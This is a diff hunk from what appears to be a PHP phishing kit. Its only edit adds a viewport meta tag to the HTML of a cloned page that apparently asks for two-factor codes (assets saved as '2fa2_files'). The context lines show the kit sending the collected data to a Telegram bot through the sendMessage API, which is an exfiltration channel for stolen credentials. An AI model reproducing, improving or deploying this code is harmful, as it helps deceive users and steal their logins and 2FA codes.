@@ -213,7 +213,10 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
                                  http_build_query($data) );
                                                     
 
-?><html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+?><html lang="en"><head>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
     
     <script async="" src="https://www.googletagmanager.com/gtm#######?id=GTM-K5TWTL"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics#######"></script><script gtm="GTM-WRXZKF2" type="text/javascript" async="" src="https://www.google-analytics.com/gtm/optimize#######?id=GTM-MHDS5LR"></script><script async="" src="https://www.googletagmanager.com/gtm#######?id=GTM-K5TWTL"></script><script type="text/javascript" async="" src="./2fa2_files/analytics#######.download"></script><script gtm="GTM-WRXZKF2" type="text/javascript" async="" src="./2fa2_files/optimize#######.download"></script><script type="text/javascript" async="" src="./2fa2_files/gtm#######.download"></script><script async="" src="./2fa2_files/gtm#######(1).download"></script><script>
